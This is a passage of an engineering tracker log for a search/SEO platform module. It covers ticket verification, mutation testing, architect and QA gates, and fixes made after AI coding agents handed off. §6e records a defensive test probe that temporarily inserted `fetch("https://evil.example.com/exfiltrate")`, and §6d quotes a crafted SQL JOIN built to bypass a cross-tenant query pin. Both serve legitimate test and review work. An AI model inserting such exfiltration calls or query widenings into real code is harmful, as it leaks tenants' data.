  are upper bounds; new per-provider ceiling tier (SM-40, engagement→tenant→provider→global);
  foundation's $8–10/client figure superseded — recompute from rollups after first staging month.
- **Simulation (§A4):** budget sums mode-filtered (`simulated = <mode>`, NOT NULL DEFAULT false);
  cache cross-mode reads forbidden BOTH directions (column predicate, PK unchanged); live mode
  never registers sim drivers (boot error); simulated data kept + badged forever, no purge —
  production starts from migrations + seeds, never from a sim-era DB copy.
- **Boundary (§A5):** vendor APIs only via `SearchDataProvider` through `dispatchProviderOp`; AI
  only via ai-gateway-go; MCP Hub serves our tools, never vendor transport. **SM-28 re-scope
  CONFIRMED:** deferred — superseded by SM-34 (a connector path would be a second, unmetered
  Semrush cost meter = fail-open by construction); claude.ai connector remains a human research
  aid only, output never ingested.
- **Tickets (§A6):** SM-33 + SM-34/35 amended MID-FLIGHT (A1–A3: mode-filtered sums + symmetric
  cache predicate + real rate tables; B1–B4: no-rate ⇒ no-registration, upper-bound estimates,
  registration mutual exclusion); SM-36 re-specced (matrix config + additive 0048 keyword
  provenance, medior ⚡); SM-37 confirmed — reached DEV-VERIFIED mid-review (record below), so its
  provenance-stamp correction is RETROACTIVE: if the seed ever adds keyword metric values, they must
  stamp `metrics_provider`/`metrics_simulated` once 0048 (SM-36) lands; SM-38 AC concretized
  (chip per number, controller-SELECT verification per §4i); SM-39 slimmed to obedience-proof +
  doc reconcile; **NEW SM-40** (per-provider ceiling, senior-be ⚡) + **NEW SM-41** (staging
  real-data acceptance, qa, gated per vendor). **No new Opus flags**; SM-21/25 keep theirs.
  Order: SM-33 ∥ SM-34/35 → SM-36 → SM-40 ∥ SM-37 → SM-38 → SM-39 → SM-17 → SM-14 ∥ SM-15 →
  SM-16 → SM-41.
- **Owner decisions opened (§A7):** OQ-9 Semrush plan/units · OQ-10 Ahrefs API access ·
  OQ-11 DFS adoption (ex-OQ-2) · OQ-12 allowance headroom (default 50%).

### SM-37 — **DEV-VERIFIED 2026-07-29** (run twice against the live dev database by me)

`src/seed/search.ts` + `seed:search`. Verified row counts in `gaiada_platform`: 1 engagement
(active, `$50` budget, 6-tool `tool_scope` with `ai_visibility` deliberately `enabled:false`),
1 verified property, 2 keyword sets, **25** keywords carrying `cluster_id`/`cluster_label`/`intent`,
1 completed audit, **11** findings, 2 KPI targets, 1 content brief. Second run printed
"already seeded" and inserted nothing.

**Two defects found and fixed after the agent handed off** (it reported "ready to test" without
running it, so neither would have been caught by its own report):

1. **RLS rejected every write.** 0034 writes each `search_*` policy as
   `tenant_id = ANY(app_current_tenants()) AND app_module_allowed('search')`, so `withTenants(...)`
   without the third `{ modules: ["search"] }` argument fails with *"new row violates row-level
   security policy for table search_properties"*. Every call in the file omitted it. This is a trap
   worth knowing for any future search seed or script: the module scope is **required**, not an
   optimization — omit it and search rows are invisible on read and rejected on write.
2. **The audit's severity summary was hand-written and wrong** — it claimed
   `critical 1 / high 3 / medium 8 / low 12 / info 5` = **29** findings while inserting **11**. The
   console's audit header would have shown 29 above a table of 11: the same "confident wrong answer"
   failure mode as §4i's three drift bugs, seeded straight into the demo data. Now **derived** from
   the findings array (`{critical:1, high:3, medium:4, low:2, info:1, total:11}` — verified in the
   DB), so the two cannot drift again.

Invocation note for the runbook: the seed calls `migrate()`, so it needs **both**
`DATABASE_URL` (platform_app) and `MIGRATE_DATABASE_URL` (platform_owner) — app-role-only fails with
"permission denied for schema public".

---

## 4j · ⚡ P1 frontend gate — SM-12 + SM-29 + SM-11 re-verify (2026-07-29) · **ALL PASS**

Independently re-verified by me after the gate: `tsc --noEmit` clean, UI **577/577** (61 files).
QA drove a real browser (`DEMO_MODE=1` on port 3021; 3000/3005 occupied), logged in, company
switched to the seeded agency where SEO is `dept-3`.

**Envelope audit came back clean** — this was the primary attack, given §4i's three drift bugs in one
day. Every field the console reads was checked against `search.controller.ts`'s actual SELECT and
response construction: both §4i fixes are present and correct (`TOGGLE_LIMIT_FIELD` writing
`maxKeywords`/`maxQueries` rather than the invented `limit`, and the engagement LIST selecting
`tool_scope` so "N of 5 metered tools on" is real). `moneyOrNull` confirmed on both leaking endpoints
— no `.toFixed()`-on-a-numeric-string crash path remains.

**Attacks that held** (published because "looks fine" is a failed review): the money/KPI honesty
invariant on `sm-eng-2` (missing projection renders "—" and "did not answer" for budget, projected
cost, over-budget and every per-tool cost — never `0`); absent-toggle vs explicit `enabled:false`
rendering identically; the full live scope round trip (toggle → preview $18.71→$19.71 UNSAVED → save →
reload holds); the over-budget banner in both live and persisted states; a full triage cycle
(open → fixed → reopen, with the button set changing correctly at each step); import → embed → cluster
end to end; the SM-32 cap refusal returning the backend's verbatim message and leaving the set at 3
rows — **no partial write**; the keyword-volume three-state (real value / "— (not pulled)" / disabled);
and no regression to the Web Dev, Creatives or Social Media consoles.

### Finding (fixed by me) — the demo fixture had regressed to the pre-SM-32 CSV parser

`platform-ui/src/lib/demoFixtures.ts`'s `parseDemoKeywordImport` was `text.split("\n")` then
`line.split(",")` — **precisely the pipeline SM-32 fixed in the backend** (§4h). Importing
`"comma, in quotes" widget` in DEMO_MODE silently mis-split into keyword `"comma` with the remainder
as a locale: no crash, no error, a confident wrong answer.

Not a production defect — `keyword-import.ts` is correct — but it matters more than "demo-only"
suggests, and §4i already explains why: **a fixture that is wrong in a way the product is not makes
DEMO_MODE QA produce false negatives about the product.** Anyone verifying CSV quoting in demo mode
would have concluded the shipped parser was broken.

**Fixed** by porting the real `parseCsvRows` state machine into the shim, with the duplication
documented as duplication (separate projects cannot share code, so it must be kept in step). Two
further divergences surfaced while there and were fixed in the same pass — the shim also lacked the
`keyword` **header-row skip** and the `(keyword.toLowerCase(), locale)` **dedupe** the backend has, so
demo mode disagreed with the product in three ways, not one. An unterminated quote now returns 400
with the backend's own message instead of throwing. Re-verified: `tsc` clean, UI 577/577.

### Two items honestly marked, not passed

1. **UNTESTABLE live:** negative-permission rendering (`search.manage=false` /
   `search.scope.write=false`) *inside* an accessible department. The only IC-tier demo identity has
   no grant scoped to `dept-3` at all, so it 404s before UI gating is ever reached. Verified by code
   inspection instead (ScopeEditor disables inputs + omits Save; AuditFindingsPanel renders a badge
   instead of triage buttons; KeywordWorkbench omits the whole import/embed/cluster block), and the
   real boundary is Cerbos server-side, already proven 25/25 at the SM-03 gate. **To close it later:
   add a `search_staff`-only demo identity scoped to `dept-3`** — worth doing before SM-38.
2. **Inherited, not re-derived:** the zero-department-company empty state. This diff does not touch
   department resolution, and it was proven at the SM-11 gate (§4e).

---

## 6a · SM-34 + SM-35 record (2026-07-29) — vendor drivers + the wave's wiring surface

`providers/semrush.ts` (+29 tests) · `providers/ahrefs.ts` (+28 tests) · `"ahrefs"` added to
`ProviderKey` · `config.search.{semrush,ahrefs,providerMode}` · `main.ts` registration ·
env documented in `platform-nest/.env.example`, `infra/compose/.env.example`,
`docker-compose.vps.yml`. Agent-reported: search suite **16 files / 255 tests green** with
`TEST_DB_PREFIX=sm34`, `tsc` clean, `lint:withtenants` clean (114 files).

**Mid-flight amendments B1–B4 absorbed** (the first draft had hardcoded assumed $/unit constants;
the addendum ruling landed and it reworked both drivers).

**B1 verified by me at the code, not on the report — it is enforced at TWO layers:**
`create{Semrush,Ahrefs}ProviderFromConfig()` returns `null` unless `costPerUnitUsd > 0` (computed
from owner-supplied plan price ÷ unit allowance, defaulting to 0), **and** `estimateCostUsd` throws
on a non-positive rate even if a driver is constructed directly, bypassing the factory. That second
layer is the one that matters: a $0 rate does not merely under-report, it silently disarms every
budget tier, which is the §4d fail-open class arriving through configuration instead of code.

**B3 verified:** `main.ts` has a real `assertProvenance()` boot **throw** (not a warning) enforcing
mode/driver mutual exclusion structurally, re-checked at the object level rather than trusting the
branch. Per-vendor keyless disable is genuinely independent, with **distinct log lines for "key
present but no rate" vs "no key"** — different operator problems, so collapsing them would send
someone hunting the wrong one.

**Capability sets already matched addendum §A2** (neither vendor advertises `ai_visibility` or
`suggestions`), so no correction was needed there.

**Carry-over, ticketable (B2 half-done):** Ahrefs returns a confirmed
`x-api-units-cost-total-actual` response header — captured by the driver but **not wireable into
billing true-up without a `SearchDataProvider` interface change**, so it is out of SM-34/35's scope.
Consequence: Ahrefs ops bill at the conservative upper-bound estimate with no downward true-up, so
the ledger over-states Ahrefs cost-to-serve. Fail-safe direction (over-count refuses early), but it
degrades the cost model's accuracy — the interface change belongs with SM-40 or its own ticket.

**Unverified and correctly flagged rather than asserted:** both vendors' real plan tier and unit
pricing (OQ-9/OQ-10 — owner must read the account consoles); envelope wrapper key names beyond
Ahrefs domain-rating/serp-overview, documented as assumptions and exercised only through mocks.
Endpoint research cited to developer.semrush.com and docs.ahrefs.com.

**State: DEV-VERIFIED for its own scope; ⚡ gate still owed** (contract-touching: `ProviderKey`,
config, bootstrap). Gate it together with SM-33 — same dependency chain, same edit surface, exactly
as SM-04/05/06 were gated as one.

---

## 6b · SM-33 record + wave-2 verification (2026-07-29)

**Independently verified by me after both agents finished** (the tree was finally stable):
platform-nest **86 files / 924 tests passed, 0 failed, in ONE `npx vitest run`** ·
`tsc --noEmit` clean · `lint:withtenants` OK (114 files). Env: `TEST_DB_PREFIX=pgtest_lead`,
`DATABASE_URL_TEST`, `CERBOS_URL`, `REDIS_URL=redis://localhost:56380`.

⚠️ **`REDIS_URL` is now a prerequisite** for a clean full run — without it
`search-notifications.test.ts` fails 3 tests with `Error: REDIS_URL not set` from `events/redis.ts`.
That is an env prerequisite, not a behaviour defect. Add it to §0's recipe.

**SM-33 delivered:** `providers/simulation.ts` (+43 tests), migration
`0047_search_provider_simulation.sql`, provenance through `dispatch.ts`/`ledger.ts`/`cache.ts`,
`FRONTEND-BFF-CONTRACT.md` §14 updated. Deterministic FNV-1a/mulberry32 seeding from
(vendor, normalized query, locale, location) — no `Math.random`, no `Date.now`. Unadvertised
capability methods **throw** rather than return plausible data. `cost-projection` gains additive
`providerMode` and `perTool[].simulated` with no controller edit.

**The mechanism ruling changed its build, correctly.** It had shipped cache-keyed-on-mode; §A4.2
overrode that to a `simulated` column + equality predicate. Implemented as ruled, with one
improvement worth keeping: `readFreshCache(c, key, simulated)` takes the mode as a **required**
parameter, not a defaulted one — "forgot to pass the mode" is the §4d fail-open shape, so it is now
a compile error instead of a silent wrong answer.

**Amendment A1 went further than the ruling, and was right to:** the global-MTD **TTL cache is
keyed per mode**. One shared slot would have served the other ledger's total for up to 30s — a
fail-open that no amount of staring at the WHERE clause would reveal. The `GLOBAL_MTD_QUERY_SQL`
shape pin was amended visibly and made *stricter*: the filter must be `$1` (never a hardcoded
`true`/`false` — either literal breaks one ledger), exactly one placeholder, no `OR` and no extra
`AND` (an `OR` would re-union the two ledgers while still reading like a filter in review). The
ratified allowlist line was re-pointed 124→162.

**Mutation-tested, which is why the green run is worth believing:** it deleted both mode predicates
and re-ran — **10 of 43 tests failed**, including all four mode-specific ones — then restored and
re-verified. A money-path test that passes with the guard removed is worthless.

### Two gaps it found but did not own — both fixed by me in `modules/search/index.ts`

1. **The `search.provider_cost.month` rollup had no mode filter.** It is `isMonetary: true` and
   feeds the **exec cross-company money rollup**, so a month of demoing would have reported
   synthetic dollars as real spend — an unlabelled plausible number in the surface least able to
   sanity-check it, and the same family as the AC SM-33 had just discharged. §A4.1 named only the
   two stop-loss sums, so this sat outside both the ruling and the agent's file ownership.
   **Fixed:** filters on the *current* mode, which is correct in both directions — a live instance
   cannot create simulated rows at all (boot-time mutual exclusion), so their only presence under
   live mode is a formerly-simulated environment whose synthetic history must not count as cash;
   and a simulate-mode instance is a demo throughout, where the simulated total is the honest answer.
2. **Migration `0047` was missing from the module's declared `migrations` list** (0034/0035/0045/0046
   only). Added.

### Applied to the long-lived dev database by me

The agent only ever applied 0047 to fresh per-file test databases. `migrate()` run against
`gaiada_platform`; verified in `information_schema`: `search_provider_calls.simulated` and
`search_data_cache.simulated` both `boolean NOT NULL DEFAULT false`. ⚠️ **The running `:3004`
container is a built image and is still stale** — it needs a redeploy before SM-38/SM-17 surfaces
read `simulated`, on top of the staleness already recorded in memory `ui-backend-wiring-2026-07-16`.

### Carry-overs to ticket, not silently accepted

- **Ahrefs true-up is half-built (B2).** The driver captures the confirmed
  `x-api-units-cost-total-actual` header but cannot feed it into billing without a
  `SearchDataProvider` interface change. Ahrefs ops therefore bill at the conservative upper bound
  with no downward correction: fail-safe in direction (over-count refuses early) but it overstates
  Ahrefs cost-to-serve. Belongs with SM-40 or its own ticket.
- `SearchDataProvider` has no `simulated` field, so provenance is read structurally via
  `isSimulatedProvider` (which `main.ts`'s boot assert already uses). A `readonly simulated?: boolean`
  on the interface would be cleaner; the structural read keeps working either way.
- **Coupling to know about:** `simulation.ts` imports `SEMRUSH_RATES`/`AHREFS_RATES` and both
  `compute*CostPerUnitUsd` (required by A3). Renaming those breaks it loudly at `tsc` — intended.
- Sim drivers deliberately diverge from §A3.3's "unset rate ⇒ don't register": a simulator that
  refused to register without vendor pricing would have nothing to demo, so named
  `PLACEHOLDER_*_USD_PER_UNIT` constants stand in, never asserted as vendor truth and superseded the
  moment config carries real plan facts (test-pinned). Ahrefs SERP prices at **$0** because it is
  confirmed free upstream — fidelity over plausibility.

**State: SM-33 + SM-34 + SM-35 all LANDED** — ⚡ gate cleared 2026-07-29, both halves: architect
APPROVE-WITH-NOTES ×3 (§6c) + QA PASS ×3 (§6d). Gated as one chain, as SM-04/05/06 were.

---

## 6c · ⚡ Wave-2 gate — SM-33 + SM-34 + SM-35, ARCHITECT HALF (2026-07-29)

**Verdicts: SM-33 APPROVE-WITH-NOTES · SM-34 APPROVE-WITH-NOTES · SM-35 APPROVE-WITH-NOTES.**
No blocking defect. QA's adversarial half runs concurrently and closes the gate independently.
Full rulings in addendum **§A8** (A1.1); this record is the tracker-side summary.

**A1–A3 / B1–B4 audit — implemented as ruled, verified at the code + pins, not on report:**
A1 mixed-table AC pinned both directions (`simulation.test.ts` 698/725/752); A2 symmetric cache
predicate + atomic cross-mode overwrite + end-to-end flip pinned (762/776/791) and the pre-SM-33
cache-key string pinned literally (841); A3 DFS-rate parity pinned per op kind (399). B1 two-layer
(factory null + defensive `estimateCostUsd` throw, incl. Ahrefs's free `serp`); B2 estimates
upper-bound with the Semrush no-true-up limitation stated, Ahrefs header captured; B3 real boot
**throw** via `assertProvenance` at the object level; B4 derivation comments name both
owner-supplied inputs as UNVERIFIED (OQ-9/OQ-10). Capability sets match §A2/§A6 byte-for-byte
across all three vendor pairs (sim mirrors real exactly; `ai_visibility`/`suggestions` absent from
both prepaid vendors; nothing blends difficulty — every payload/cache/ledger row is single-vendor
with `provider` carried; no silent substitution exists anywhere in the diff, honor-or-refuse pinned).

**The two declared deviations — ruled:**
1. **`PLACEHOLDER_*_USD_PER_UNIT` — RATIFIED.** Not actually a deviation: §A3.3 governs live-driver
   registration (its failure mode — unmetered real spend — cannot occur in a simulator); §A4.5
   already licensed the placeholder. Containment invariant (why it can never read as a real rate):
   reachable only from the sim pricing path, computed through the live derivation functions, and
   every placeholder-priced figure is created by a sim driver ⇒ carries `simulated = true` through
   ledger/cache/projection/rollup; config supersession test-pinned. §A3.3 scope note added (§A8.1).
2. **`readFreshCache` required mode param + per-mode TTL cache — CONFIRMED.** The required
   parameter is a strictly stronger implementation of A2 (compile error where a default would be a
   silent cross-mode read). The per-mode TTL key is a **necessary consequence** of A1, not an
   independent decision: A1 made the cached quantity mode-dependent; one shared slot would serve
   the other ledger's total for up to 30s — the fail-open no WHERE clause would reveal. Pinned
   (`ledger.test.ts:101`).

**`GLOBAL_MTD_QUERY_SQL` — ratification CARRIES FORWARD as amended.** Still one scalar aggregate,
read-only, single statement, no client-private column; the amended pin is *stricter* (parameterized
`$1` only, no hardcoded mode, no `OR`, exactly one `AND`). **Line-keying REVERSED** (§A8.6): three
re-points in two days proved a shift forces a re-point, not a re-look — re-key by file +
first-argument source text + expected match count. → **SM-43**.

**Rollup fix (`search.provider_cost.month` current-mode filter) — RATIFIED** with the boundary
stated: correct both directions because live-mode rows are `simulated = false` by construction
(boot exclusion + dispatch OR-stamp); after any mid-month flip the rollup reports only the current
partition, acceptable because a flip is an environment-rebuild event (§A4.4), never a runtime
toggle. **Coverage sweep (the "no more accidents" enumeration, §A8.2):** all current readers
filtered/stamped/inherent — and one REAL gap found: the three snapshot tables
(`search_rank_snapshots`, `search_backlink_snapshots`, `search_ai_visibility`) have `provider` +
nullable `provider_call_id` but **no `simulated` column**, so SM-14/16 would persist synthetic
payloads with nowhere to stamp the provenance `DispatchResult.simulated` hands them — §A4.4's
"badged forever in any historical view" was unimplementable as schema'd. **0048 (SM-36) extended:**
`simulated boolean NOT NULL DEFAULT false` on all three; SM-14/16 AC stamp it. New standing rule
§A4.7: every future reader/persister of provider-derived rows states its mode handling in its AC.

**Ahrefs true-up — acceptable to ship; own ticket, deadline set.** Fail-safe direction (over-count
refuses early) but it overstates Ahrefs cost-to-serve, biasing fairness caps, margin analysis and
§A3's computed blended per-client figure. → **SM-42, and it must land BEFORE SM-41** (the
ledger-vs-console reconciliation and the first-staging-month recompute are what the bias poisons).
NOT folded into SM-40 — ceiling tier and interface change are different invariants. Also corrected:
SM-35's "estimates equal the true cost" **overclaims** — Ahrefs per-field cost classes (some fields
5–10 units) are unverified for the exact `select=` list, so the volume estimate is not proven an
upper bound; SM-41's Ahrefs row reconciles that op explicitly.

### Follow-up tickets (recorded, not dropped)

| # | Scope | Tier · model | Deps / order |
|---|---|---|---|
| **SM-42** | `SearchDataProvider` true-up seam: optional post-call actual-cost surface consumed by dispatch; true-up moves the POSTED row to actual (both directions), never re-runs budget arithmetic; per-op attribution must survive concurrency (current `lastObserved` is last-call-wins and would drop the first of `getBacklinkSummary`'s two parallel calls — fine while informational, wrong the moment it bills) | senior-be · default | after SM-40, **before SM-41** |
| **SM-43** | `lint-withtenants` allowlist re-keying: `{file, argPattern, maxMatches:1, reason}` replacing `{file, line}`; keep the stale-entry warning; all four existing entries migrated verbatim | medior · default | none; do before the next ledger.ts edit |
| **SM-44** | Provider-layer micro-hardenings, one file each, ACs exact: (a) `writeCache` `simulated` param REQUIRED (mirror `readFreshCache` — the forgot-the-mode hazard is currently open on the write side, in the under-labelling direction); (b) sim `estimateFor` reads `config.search.dataforseo.queue` so DFS serp/ai_visibility sim pricing is queue-aware like the live driver (today a live-queue demo under-prices 3.3x); (c) Ahrefs factory drops `serp` from the advertised set when `rankTrackerProjectId` is unset (advertised-but-unservable today; refusal is loud but projection prices $0 for an impossible pull) | junior · default | none; before SM-38 demos |
| SM-36 (amended) | 0048 gains the three snapshot-table `simulated` columns (§A8.3); the seeded `serp` preference list stays length-1 `[dataforseo]` even though Semrush/Ahrefs truthfully advertise `serp` — theirs is DB-snapshot semantics, §A2's exact no-substitute reason | (unchanged) medior ⚡ | as sequenced |
| SM-17 (amended) | usage/ledger surface AC inherits §A4.7: mode badge on every rendered row/sum | (unchanged) | as sequenced |

**Standing note for the QA half:** the two WHERE predicates (A1/A2) were this gate's named review
focus — inspected and correct at `ledger.ts:74/111` and `cache.ts:89`, with the mutation-test
evidence (10/43 fail with predicates deleted) accepted as the reason the green run is believable.

---

## 6d · ⚡ QA gate — SM-33 + SM-34 + SM-35 (2026-07-29) · **ALL PASS**

Gated as one chain (same edit surface), alongside the architect review in §6c (APPROVE-WITH-NOTES ×3).
QA-observed: search module **18 files / 306 tests green**, run 3× including after every mutation
restore; `tsc` clean; `lint:withtenants` OK (114 files).

**Mutation-tested the guards the implementer did NOT choose to test** — live against Postgres, each
file restored to byte-identical original afterwards (confirmed by `diff`): pillar gate → 2 failures ·
scope-toggle gate → 4 · `costPerUnitUsd > 0` defensive throw → 1 · both mode predicates removed
together → 12 (reproducing the implementer's own 10/43 claim; the count differs only because the
suite grew). **Every mutation was caught — no guard on this path is untested.** This is the standard
worth keeping: a money-path test that stays green with its guard deleted is worthless, and the only
way to know is to delete it.

### The one defect found — the SQL shape pin was bypassable

The pin is the enforcement half of a *ratified* cross-tenant lint allowlist entry, so a weak pin
means the ratification guards nothing. QA constructed a plausible widening:

```sql
... FROM search_provider_calls INNER JOIN search_engagements se ON se.provider_budget_usd > 0 WHERE ...
```

and proved it passed **every existing assertion**. The table-capture regex
(`FROM\s+(\S+)`) anchors only the FIRST token after `FROM`, so the captured table still read
`search_provider_calls` — innocent-looking. The join's ON-condition names no blocklisted column, is
not a mutation keyword, and sits *before* `WHERE`, so the AND/OR-count checks never see it either.

**Verified independently by me, not on the report:** the attack string passes the old table-capture
pin (capturing `search_provider_calls`) and is rejected by the new anchored assertion
`/FROM\s+search_provider_calls\s+WHERE\s+/i`. `ledger.test.ts` 10/10 green.

**Test-only fix; `GLOBAL_MTD_QUERY_SQL` itself was never wrong** — only its enforcement was
incomplete. Worth recording as a general lesson: a shape pin that captures a *name* proves nothing
about what surrounds it. Anchor the structure, not the token.

**SM-33 / SM-34 / SM-35 → LANDED** (both gate halves discharged). Follow-ups SM-42/43/44 carried in
§6c; SM-36 and SM-17 amended there.

---

## 6e · SM-39 boundary audit (2026-07-29) — **DEV-VERIFIED for the code boundary**, plus a live-stack finding

### The durable half: `src/modules/search/egress-inventory.test.ts` (4 tests, verified green by me)

Static **AST analysis** (TypeScript compiler API) rather than a runtime trace, and the reasoning is
right: a dynamic capture only proves what the suite's own fixtures happen to exercise, and would
re-derive "vendor vs gateway vs rogue" from a URL on every run. The AST walk pins the classification
against the source once. What it asserts:

1. **No network primitive** (`fetch`, `axios`, `got`, `XMLHttpRequest`, `WebSocket`, raw
   `http`/`https`/`net`/`tls`/`dgram`/`dns`) anywhere in `src/modules/search/` outside an exact
   5-file allowlist — `providers/gateway-client.ts`, `knowledge-client.ts`, and the three vendor
   drivers — asserted by **set equality**, so a new file gaining a call AND an existing one losing
   its call both fail.
2. **No direct `SearchDataProvider` method call** outside `dispatch.ts`'s `invokeProvider()` — this
   is B-1 proven mechanically: every vendor call is metered and gated, by construction.
3. **Cross-contamination guard** — each approved file references only its own `config.*` namespace.
4. A sanity assertion that the scanner actually walked files, so a silently-empty scan cannot pass.

**It proved the test catches violations rather than merely passing today:** temporarily added
`fetch("https://evil.example.com/exfiltrate")` to `scope-presets.ts`, watched the suite fail naming
the exact offender and line, then reverted and re-confirmed green. That is the difference between a
test and a decoration.

### B-2 (AI only via the gateway) — confirmed end to end

`gateway-client.ts` is the module's sole AI egress and fail-closed before any fetch when unconfigured;
`clustering.ts` reaches it only through the imported helpers; `ai-drafts.ts` has **zero I/O** (pure
builders/parsers); `knowledge-client.ts` speaks only to the sibling WS8 service; `simulation.ts` has
no `fetch` at all. Each vendor driver has exactly one `fetch` site against its own configured
`baseUrl`. Each `create*ProviderFromConfig()` is called **only from `main.ts`** — verified by grep
across the whole `platform-nest/src` tree — so no path constructs a driver outside the
registry → `dispatchProviderOp` chain. **B-3/B-4 hold:** `mcp-hub` only ever calls the platform's own
`/mcp/tool-defs` and callable `pathTemplate`s; no hub code path reaches a vendor host.

### mcpTools: declared and exposed correctly — but the RUNNING hub serves none

- 18 `search.*` mcpTools declared in `modules/search/index.ts`, pinned by `search.test.ts`.
- Aggregation is genuine, not hardcoded: `/mcp/tool-defs` is `allModules().flatMap(m => m.mcpTools)`
  with no per-module special-casing, and `mcp-hub`'s `registerModuleTools()` is def-driven — it has
  no concept of "search" at all.
- **Live-verified against the running `:3004`: 30 tool defs, 18 of them `search.*`** — the platform
  side is correct.

**⚠️ Finding, confirmed independently by me from the container logs and the live hub:** the running
`gaiada-mcp-hub-1` serves **0** `search.*` tools. Log line:
`[module-tools] /mcp/tool-defs unavailable (fetch failed) — module tools not loaded`.

Cause is a **boot-order race, not a boundary violation**: the hub started ~45s before the platform
finished booting, `registerModuleTools()` runs **once** at hub boot, and it is deliberately fail-soft
with **no retry** — so it froze at zero and has never self-healed.
`docker-compose.vps.yml`'s `mcp-hub.depends_on` uses the plain list form (start-order only, no
`condition: service_healthy`), and `platform` has no healthcheck for such a condition to attach to.

**This is broader than search** — it means *every* module's MCP tools are absent from the running
hub, so no agent or n8n flow can call any module tool right now. Ticketed as **SM-45** (devops):
platform healthcheck + `condition: service_healthy`, and/or a periodic re-fetch with backoff so a
slow platform boot self-heals instead of freezing forever. The second is the more robust fix — an
ordering constraint only helps at boot, whereas a re-fetch also survives a platform restart.

QA note worth keeping: the agent attempted `docker restart` to re-verify, was blocked, and **declined
to manufacture a green result by restarting mid-audit**. Correct call — the finding is about what the
stack is actually doing, not what it would do after a nudge.

### Tracker edits owed by SM-39, applied

- **SM-28** → deferred, superseded by the SM-34 HTTP driver (addendum §A5). **OQ-3 no longer gates
  anything.**
- **P2 rows (SM-14/15/16/17):** build is unblocked against SM-33 simulation; each ticket's real-data
  clause moves to **SM-41**. OQ-2 is a staging prerequisite only.

---

## 6f · SM-43 — allowlist re-keyed by content (2026-07-29) · **DEV-VERIFIED after one fix**

`scripts/lint-withtenants.mjs` only. Entries are now keyed on **(file, tenant-argument source text,
match count)** instead of file + line, with whitespace-normalized matching. All four ratified entries
migrated verbatim, justification comments preserved (they are the audit trail that made the
exemptions ratifiable at all): `core.controller.ts`/`all`, `service-scopes.ts`/`targetIds`,
`events/relay.ts`/`tenantIds`, `providers/ledger.ts`/`ids`.

The line-keying that this replaces had been re-pointed **four times** (70→80→124→162) in two days,
every one mechanical. The architect's original "a shift forces a re-look" justification was reversed
on that evidence at the §6c gate.

### The fix — `maxMatches` existed but was not enforced

The implementer's three probes all passed (call moves → still OK; a *differently*-named second call →
FAIL; changing the argument name → FAIL). But none of them covered the case that content-keying
newly makes possible, and it was open:

**A second cross-tenant call in an allowlisted file reusing the SAME argument name was silently
permitted.** The entry matched it, the count went to 2, and the mismatch printed a `console.warn`
while the process **exited 0**. So CI passes, nobody reads the log, and a call that was never reviewed
inherits a ratified exemption purely because it happens to use a short, eminently reusable variable
name (`ids`, `all`, `tenantIds`). Line-keying identified exactly one call; content-keying is
deliberately position-independent, so `maxMatches` is the *only* thing bounding the entry — and a
bound that only prints to stderr is not a bound.

**Fixed:** a count mismatch is now a hard failure with a message stating that a new cross-tenant call
does not inherit an existing entry's ratification just because it shares a variable name. Staleness
(count 0) also fails: these are architect-ratified security exceptions, so one matching no call is an
exemption granted to nothing, and leaving it lying around invites its accidental re-pointing at some
future call.

**Verified by me, not on the report:** clean tree passes (114 files scanned). Probe — appended a
second `withTenants(tenantIds, …)` to `src/events/relay.ts` → **exit 1**, `expected 1 match(es), but
found 2`. `relay.ts` restored and confirmed **byte-identical by md5**; clean tree passes again.

**Lesson worth keeping (third time this program):** a guard's *reporting channel* is part of the
guard. §4d was a `catch` degrading to `0`; §6d was a shape pin anchoring a name instead of a
structure; this was an enforced-looking count that only warned. All three read as protection in
review and provided none.

---

## 6g · SM-38 — simulated-data badging (2026-07-29) · **DEV-VERIFIED**

Verified by me: `tsc --noEmit` clean · UI **591/591 across 62 files** (was 577/577 across 61 — +14
tests, zero regressions) · `next build` green.

New `components/search/SimulatedBadge.tsx` (`SimulatedBadge` / `ProviderLabel` /
`ProviderModeStatement`, 10 tests), badges wired into `ScopeEditor`'s per-tool cost cells and preview
total plus the engagement header and KPI tiles, `KpiTile.value` widened to `ReactNode` (backward
compatible) so a chip can ride the figure. §A2 clause 2 satisfied — every provider-sourced number
carries its **vendor label**, because the addendum forbids blending precisely so nobody downstream
averages a Semrush KD with an Ahrefs KD.

**Fields verified against the controller's real envelope, not fixtures or TS interfaces** (the §4i
discipline): `ProjectedToolCost{…provider,simulated,…}` and `projectMonthlyCost() → {perTool,
totalMonthlyUsd,providerMode}` in `dispatch.ts`, confirmed spread unchanged by
`getEngagementCostProjection`. Also confirmed by Grep what does **not** exist: no ledger GET route at
all (SM-17), and `listKeywords`'s SELECT carries no `metrics_provider`/`metrics_simulated`.

**The mid-flight snapshot-column constraint was honoured.** No `simulated` field was typed onto any
rank/backlink/AI-visibility row type — `undefined` is falsy, so that would have rendered synthetic
data as REAL, the worst available failure direction for this ticket. For `search_keywords` it chose
**no chip and no claim**, documented in `KeywordWorkbench.tsx` and FRONTEND-BFF-CONTRACT §14 naming
SM-36/0048 as owner, with the platform-mode statement recorded as the fallback for any P2 ticket
landing ahead of 0048.

**Presence AND absence proven in one browser pass** (`DEMO_MODE=1`, port 3033): `sm-eng-1`
(simulate) → header "Data mode: SIMULATED", `$10.71 · DataForSEO` + SIMULATED on the two enabled
toggles, chips on both KPIs and the preview total, and **no** chip/label on disabled toggles;
`sm-eng-2` (live, no persisted projection) → header reads **"— (unknown)"**, never "Live" and never
`$0`, and its what-if preview row shows `DataForSEO` with **no** chip. A fixture where everything is
simulated would have proven nothing; this one proves the chip's silence too.

### Correction to §4j — the "IC identity 404s" finding was misdiagnosed

The previous gate recorded that the only IC-tier demo identity 404s before UI permission-gating is
reached, implying a missing `dept-3` grant. **That is not what happens.** `getActiveTenant` defaults
to `me.companies[0]` when no tenant cookie is set; for the elevated demo user that first company is
`co-holding`, which has no departments — so `/departments/dept-3` 404s **until the company switcher
is used**, which the verification instructions say to do anyway. Both `member` and elevated
identities reach dept-3 once switched, with no code change needed. Recorded because §4j's stated
remedy ("add a `search_staff`-only identity scoped to dept-3") was aimed at a cause that did not
exist.

The new identity was added anyway and **earns its place for a different reason**: `seo-staff`
(`search_staff`, scoped `co-agency`/dept-3) makes the *specific* `search.scope.write=false` gate
drivable — verified live: it reaches dept-3, the `Save scope` button is absent and all five scope
checkboxes are disabled, while its `search.manage=true` correctly leaves triage and the keyword write
block **visible**. That last part is `search_staff`'s real capability set, not a gap. `gede-ic`
(`member`, `search.manage=false`) separately shows the "—" + gated note and omits the write block.

**Also cleared:** a stale file-backed demo scope store (`%TEMP%/gaiada-demo-search-scope.json`) left
mutated by an earlier session, so demo runs start from the pristine seed again.

